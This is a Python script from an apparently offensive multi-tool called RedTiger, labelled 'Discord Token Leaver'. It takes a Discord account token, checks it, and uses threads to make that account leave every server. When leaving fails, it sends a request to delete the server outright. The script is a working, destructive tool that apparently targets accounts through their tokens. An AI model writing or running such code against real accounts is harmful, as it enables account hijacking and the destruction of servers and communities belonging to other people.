# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import requests
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Leaver")

try:
    print()
    token = Choice1TokenDiscord()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        pass
    else:
        ErrorToken()
    def LeaveServer(guilds, token):
        for guild in guilds:
            try:
                response = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
                if response.status_code == 204 or response.status_code == 200:
                    print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Leave{color.RED} | Server: {color.WHITE}{guild['name']}")
                elif response.status_code == 400:
                    requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
                    print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Leave{color.RED} | Server: {color.WHITE}{guild['name']}")
                else:
                    print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error{color.RED} | Server: {color.WHITE}{guild['name']}")
            except Exception as e:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error: {e}{color.RED}")

    if token.startswith("mfa."):
        print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error: Mfa enabled{color.RED}")

    processes = []
    guilds_id = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={'Authorization': token}).json()
    if not guilds_id:
        print(f"{INFO} No Server found.")
        Continue()
        Reset()
    for guild in [guilds_id[i:i+3] for i in range(0, len(guilds_id), 3)]:
        t = threading.Thread(target=LeaveServer, args=(guild, token))
        t.start()
        processes.append(t)
    for process in processes:
        process.join()
    Continue()
    Reset()
except Exception as e:
    Error(e)